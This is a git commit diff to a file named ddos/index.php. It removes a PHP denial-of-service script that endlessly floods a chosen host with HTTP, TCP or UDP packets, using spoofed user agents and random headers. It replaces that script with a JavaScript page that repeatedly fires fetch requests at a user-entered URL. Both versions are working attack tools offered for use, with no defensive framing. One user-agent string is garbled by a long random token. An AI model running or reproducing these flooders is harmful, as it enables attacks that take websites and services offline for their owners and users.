d6230cc9f859f03f2070556bd405068e2055679a
MSI0072 <63404067+MSI0072@users.noreply.github.com>
2021-01-31 00:05:12 +0700

    Update index.php

--- ddos/index.php
+++ ddos/index.php
@@ -1,121 +1,39 @@
-<?php
+<!DOCTYPE html>
+<html>
+<head>
+    <title>JavaScript DDOS | Peel Tools</title>
+    <script>
+        var x=0;
 
-# ICWR-TECH - HTTP DoS
-# By Afrizal F.A
+        function flood(xurl,total){
 
-class dos
-{
+	        for(i=0;i<total;i++){
 
-    public function user_agent()
-    {
+                    fetch(xurl,{method:'get'});
+    	            document.getElementById("result").value=++x;
 
-        $arr = array("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZVChrome/53.0.2785.143 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36");
-        return $arr[rand(0, count($arr) - 1)];
-
-    }
-
-    public function header($host, $point)
-    {
-
-        $str = "GET /$point\r\n";
-        $str .= "Host: $host\r\n";
-        $str .= "Pragma: no-cache\r\n";
-        $str .= "Cache-Control: no-cache\r\n";
-        $str .= "Accept-Encoding: gzip,deflate\r\n";
-        $str .= "User-Agent: " . dos::user_agent() . "\r\n";
-        $str .= "Accept-language: en-US,en,q=0.5\r\n";
-        $str .= "X-a: " . rand(0000000, 9999999) . "\r\n";
-        $str .= "Connection: Keep-Alive\r\n";
-        $str .= "Accept: */*\r\n\r\n";
-        return $str;
-
-    }
-
-    public function flood($method, $host, $port, $point)
-    {
-
-        if ($method == "http") {
-
-            $packet = dos::header($host, $point);
-            $s = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
-            $req = socket_connect($s, $host, $port);
-            socket_write($s, $packet, strlen($packet));
-            socket_close($s);
-
-        } else if ($method == "tcp") {
-
-            $packet = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
-            $s = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
-            $req = socket_connect($s, $host, $port);
-            socket_write($s, $packet, strlen($packet));
-            socket_close($s);
-
-        } else if ($method == "udp") {
-
-            $packet = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
-            $s = socket_create(AF_INET, SOCK_DGRAM, SOL_UDP);
-            socket_sendto($s, $packet, strlen($packet), 0, $host, $port);
-            socket_close($s);
+	        }
 
         }
 
-    }
+        function start_flood(){
 
-}
-
-if (!empty($argv[1] && $argv[2])) {
-
-    $method = $argv[1];
-    $host = $argv[2];
-    $port = $argv[3];
-
-} elseif (!empty($_GET)) {
-
-    $method = $_GET['method'];
-    $host = $_GET['host'];
-    $port = $_GET['port'];
-
-} else {
-
-    echo "[-] [Not Valid Option!]";
-    exit();
-
-}
-
-if (!empty($method && $host && $port)) {
-
-    echo "[+] [Attacking] [$method] [$host:$port]";
-
-    while (true) {
-
-        if (!empty($argv[4])) {
-
-            $point = $argv[4];
-    
-        } elseif (!empty($_GET['point'])) {
-    
-            $point = $_GET['point'];
-    
-        } else {
-    
-            $point = "?" . rand(0000000, 9999999) . " HTTP/1.1";
-    
-        }
-
-        if (strtolower($method) == "http") {
-
-            dos::flood($method, $host, $port, $point);
-
-        } else if (strtolower($method) == "tcp") {
-
-            dos::flood($method, $host, $port, $point);
-
-        } else if (strtolower($method) == "udp") {
-
-            dos::flood($method, $host, $port, $point);
+            var xurl=document.getElementById("url").value;
+	    var total=document.getElementById("total").value;
+            flood(xurl,total);
 
         }
-
-    }
-
-}
+    </script>
+</head>
+<body>
+    <span style="font-size: 30px;">JavaScript DDOS | R&D ICWR</span>
+    <br><br>
+    URL : <input type="text" id="url">
+    <br><br>
+    Thread : <input type="number" id="total">
+    <br><br>
+    Attack Sent -> <textarea cols="50" rows="1" id="result"></textarea>
+    <br><br>
+    <button onclick="xxx=setInterval(start_flood,100)">Start!</button> <button onclick="clearInterval(xxx)">Stop</button>
+</body>
+</html>
